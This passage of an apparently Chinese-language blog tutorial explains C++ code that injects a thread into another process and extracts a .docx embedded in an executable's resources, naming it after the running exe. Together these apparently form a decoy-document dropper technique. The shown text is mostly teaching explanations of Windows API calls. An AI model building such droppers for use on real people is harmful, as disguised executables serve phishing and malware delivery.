<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    HANDLE Thread </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> CreateRemoteThread</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, (LPTHREAD_START_ROUTINE)ADDRESS, pRemoteParam, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">RETSIZE);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //执行该线程</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    CloseHandle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(Thread);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //关闭句柄</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><h4 id="从资源中提取-docx-文件" tabindex="-1"><a class="header-anchor" href="#从资源中提取-docx-文件"><span>从资源中提取 .docx 文件</span></a></h4><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">CHAR </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">PathFileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[MAX_PATH] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> // 初始化当前文件路径</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">CHAR </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[MAX_PATH] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">  // 初始化当前文件名</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// 1. 从资源中提取 \`.docx\` 文件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">HRSRC Resource </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> FindResourceA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">MAKEINTRESOURCEA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">101</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;docx&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//得到资源文件HRSRC句柄</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">HGLOBAL ResourceGlobal </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> LoadResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, Resource);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//得到资源文件ResourceGlobal句柄</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DWORD FileSize </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> SizeofResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, Resource);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//得到资源文件的大小</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">LPVOID PFILE </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> LockResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(ResourceGlobal);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//得到指向资源文件内容的指针</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">GetModuleFileNameA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, PathFileName, MAX_PATH);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//当前进程的路径和名称</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">strcpy_s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FileName, </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">strrchr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(PathFileName, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">/*</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">strrchr得到第二个参数最后出现的位置</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">d:\\\\xxxxx\\\\xxxxxx\\\\xxxx.exe在执行后得到\\\\xxxx.exe</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">所以需要+1把\\\\去掉</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">最后得到了完整的文件名</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">用strcpy_s把文件名复制到FileName中</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">*/</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">size_t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> MAX_PATH; i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;.&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;d&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;o&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;c&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;x&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        break</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//循环找文件名中的.，找到后将文件名的后缀改为docx</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//这个步骤主要是为了方便，以后只需要改exe的名称不需要到代码中来改</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">HANDLE FILE </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> CreateFileA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FileName, FILE_ALL_ACCESS, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, CREATE_ALWAYS, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//创建文件名相同的文件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DWORD dwSize;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">WriteFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FILE, PFILE, FileSize, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dwSize, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// 把资源文件中的内容写入</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>使用 <code>FindResourceA</code>、<code>LoadResource</code>、<code>SizeofResource</code> 和 <code>LockResource</code> 函数获取资源文件的内容。</li><li>使用 <code>GetModuleFileNameA</code> 获取当前可执行文件的路径，并提取文件名。</li><li>修改文件名的后缀为 <code>.docx</code>。</li><li>使用 <code>CreateFileA</code> 创建一个与当前可执行文件同名的 <code>.docx</code> 文件，并使用 <code>WriteFile</code> 将资源内容写入文件。</li></ul><hr><ul><li><p>获取资源句柄</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">HRSRC Resource </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> FindResourceA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">MAKEINTRESOURCEA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">101</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;docx&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191127940.png" alt="image-20240719112719851"></p></blockquote><p>使用 <code>FindResourceA</code> 函数获取资源的句柄</p><ul><li><code>NULL</code>：指向包含资源的模块句柄，<code>NULL</code> 表示当前模块</li><li><code>MAKEINTRESOURCEA(101)</code>：资源的标识符，这里使用的是整数 101</li><li><code>&quot;docx&quot;</code>：资源类型</li></ul><blockquote><p>对应前面项目资源中插入的这个 docx 文件</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191144194.png" alt="image-20240719114416924"></p></blockquote><blockquote><p><code>HRSRC</code> 是一个句柄类型，用于标识资源在内存中的位置。具体来说，它是一个资源句柄，用于表示在资源文件（如 <code>.exe</code> 或 <code>.dll</code> 文件）中定义的资源。</p><p>在 Windows API 中，<code>HRSRC</code> 是一个宏，定义如下:</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">typedef</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> HANDLE HRSRC;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><code>HANDLE</code> 是一个通用的句柄类型，用于表示各种对象和资源的句柄。通过使用 <code>HRSRC</code> 这个类型，Windows API 可以统一处理资源句柄，并在函数之间传递这些句柄。</p><p>下面是一些与 <code>HRSRC</code> 类型相关的函数：</p><ul><li><code>FindResource</code> / <code>FindResourceA</code> / <code>FindResourceW</code>：用于查找资源，并返回一个 <code>HRSRC</code> 类型的资源句柄。</li><li><code>LoadResource</code>：用于加载资源，并返回一个 <code>HGLOBAL</code> 类型的全局句柄。</li><li><code>SizeofResource</code>：用于获取资源的大小。</li><li><code>LockResource</code>：用于锁定资源，并返回一个指向资源内容的指针。</li></ul><p>通过这些函数，可以在程序中访问并操作资源文件中的资源。</p></blockquote></li><li><p>加载资源</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">HGLOBAL ResourceGlobal </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> LoadResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, Resource);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191450522.png" alt="image-20240719145030083"></p></blockquote><p>使用 <code>LoadResource</code> 函数加载资源，并返回资源的全局句柄。</p><ul><li><p><code>hModule</code>: 一个模块的句柄，其中包含资源</p><p><code>NULL</code> 表示当前模块。</p></li><li><p><code>hResInfo</code>: 资源句柄，标识要加载的资源。这个句柄是通过 <code>FindResource</code> 函数获取的。</p></li></ul><p>返回 <code>HGLOBAL</code> 类型的句柄，该句柄标识资源的内存块</p></li><li><p>获取资源大小</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DWORD FileSize </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> SizeofResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, Resource);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191453016.png" alt=""></p></blockquote><p>使用 <code>SizeofResource</code> 函数获取资源的大小。</p><ul><li><p><code>hModule</code>: 一个模块的句柄，其中包含资源</p><p><code>NULL</code> 表示当前模块。</p></li><li><p><code>hResInfo</code>: 资源句柄，标识要查询的资源。这个句柄是通过 <code>FindResource</code> 函数获取的。</p></li></ul><p>返回指定资源的大小（以字节为单位）。</p><p>如果函数失败，返回值为 0。要获取更多的错误信息，可以调用 <code>GetLastError</code> 函数</p></li><li><p>锁定资源</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">LPVOID PFILE </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> LockResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(ResourceGlobal);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191453348.png" alt="image-20240719145329105"></p></blockquote><p>使用 <code>LockResource</code> 函数锁定资源，并返回指向资源内容的指针。</p><ul><li><code>hResData</code>: 资源的全局句柄。这个句柄是通过 <code>LoadResource</code> 函数获取的。在这段代码中，它是 <code>ResourceGlobal</code>。</li></ul><p>返回一个指向资源数据的指针。</p><p>执行锁定资源这一步（<code>LockResource</code>）的主要原因是为了获得一个指向资源数据的指针，从而可以直接访问和操作资源内容</p><ul><li><p>尽管 <code>LockResource</code> 名字中包含“锁定”一词，它实际上并不锁定资源或对其进行任何同步操作。资源数据在加载到内存后，其位置通常是固定的。<code>LockResource</code> 提供了一个指向这块内存的指针，确保程序可以稳定地访问这块内存中的数据。</p><p>所以与其叫锁定不如叫定位(</p></li><li><p><code>LockResource</code> 返回一个指向资源数据的指针（<code>LPVOID</code>），这允许程序直接访问和读取资源的数据内容，而无需进行额外的内存复制操作。</p><p>后面写入文件内容时有用到返回的 <code>PFILE</code> 资源内容指针</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191514681.png" alt="image-20240719151447529"></p></li></ul></li><li><p>获取当前可执行文件的路径和名称</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">GetModuleFileNameA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, PathFileName, MAX_PATH);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>使用 <code>GetModuleFileNameA</code> 函数获取当前可执行文件的完整路径和名称，并存储在 <code>PathFileName</code> 中。</p><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191521357.png" alt="image-20240719152123080"></p></blockquote><p><code>GetModuleFileNameA(NULL, PathFileName, MAX_PATH);</code> 是一个调用，用于获取当前模块（通常是当前可执行文件）的文件名和路径，并将其存储在缓冲区中</p><ul><li><p><code>hModule</code>: 模块句柄，指示从哪个模块中获取文件名</p><p><code>NULL</code> 指示函数返回包含调用进程的可执行文件的路径</p></li><li><p><code>lpFilename</code>: 一个指向缓冲区的指针，用于接收模块的文件名和路径</p></li><li><p><code>nSize</code>: 缓冲区的大小，以字符为单位</p><p><code>MAX_PATH</code> 通常定义为 260，表示缓冲区大小足够大，可以存储大多数路径名</p></li></ul></li><li><p>修改文件后缀为 <code>.docx</code></p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//当前进程的路径和名称</span></span>
